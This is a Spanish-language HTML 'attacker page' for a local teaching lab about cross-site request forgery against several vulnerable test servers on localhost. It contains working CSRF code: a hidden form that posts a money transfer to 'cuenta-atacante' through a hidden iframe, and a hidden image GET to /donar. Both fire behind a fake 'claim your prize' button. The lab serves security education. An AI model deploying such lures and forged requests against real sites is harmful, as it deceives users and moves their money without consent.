<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Página atacante (Local)</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
  </head>
  <body class="bg-light">
    <div class="container py-5">
      <div class="row justify-content-center">
        <div class="col-md-8">
          <div class="card shadow-sm mb-4">
            <div class="card-body">
              <h2>Página atacante (demostración local)</h2>
              <p class="text-muted">
                Esta página simula técnicas de ingeniería social y vectores CSRF
                que funcionan contra la app vulnerable (local).
              </p>

              <div class="mt-3 d-flex gap-2 align-items-center">
                <button id="lure" class="btn btn-warning">
                  Reclamar premio
                </button>
                <div class="ms-2">
                  <label class="form-label small mb-1">Objetivo</label>
                  <select id="target-select" class="form-select form-select-sm">
                    <option value="http://localhost:3000">
                      Vulnerable (3000)
                    </option>
                    <option value="https://localhost:3010">
                      Token CSRF (3010 HTTPS)
                    </option>
                    <option value="http://127.0.0.1:3020">
                      SameSite Strict (3020)
                    </option>
                    <option value="http://127.0.0.1:3021">
                      SameSite Lax (3021)
                    </option>
                    <option value="https://localhost:3022">
                      SameSite None (3022 HTTPS)
                    </option>
                    <option value="http://localhost:3030">
                      Headers (3030)
                    </option>
                  </select>
                </div>
              </div>

              <hr />
              <h5>Vectors incluidos</h5>
              <ul>
                <li>
                  Formulario oculto (envío POST) — funciona porque el navegador
                  envía las cookies de sesión al dominio objetivo.
                </li>
                <li>
                  Imagen GET que llama a <code>/donar</code> — ilustra por qué
                  GET no debe cambiar estado.
                </li>
              </ul>

              <!-- Formulario oculto: objetivo configurable; se envía a un iframe oculto para no navegar -->
              <iframe name="stealth_iframe" style="display: none"></iframe>
              <form
                id="csrf-form"
                action="http://localhost:3000/transferencia"
                method="POST"
                target="stealth_iframe"
              >
                <input type="hidden" name="monto" value="200" />
                <input type="hidden" name="destino" value="cuenta-atacante" />
              </form>

              <img id="steal-img" src="" alt="" style="display: none" />

              <div class="mt-3">
                <button id="manual" class="btn btn-outline-danger">
                  Ejecutar ataque manual (form)
                </button>
              </div>

              <div class="mt-3 text-muted small">
                Nota: esto es local y educativo — no lo uses contra sitios
                reales.
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script>
      const select = document.getElementById("target-select");
      const form = document.getElementById("csrf-form");
      const img = document.getElementById("steal-img");

      document.getElementById("lure").addEventListener("click", () => {
        // Después de que el usuario haga clic, lanzamos los ataques ocultos
        const base = select.value;
        form.action = `${base}/transferencia`;
        setTimeout(() => form.submit(), 800);
        img.src = `${base}/donar?monto=10&destino=cuenta-atacante`;
        alert(
          "¡Felicidades! Has reclamado tu premio. Revisa tu correo (simulado)."
        );
      });

      document.getElementById("manual").addEventListener("click", () => {
        const base = select.value;
        form.action = `${base}/transferencia`;
        form.submit();
      });
    </script>
  </body>
</html>
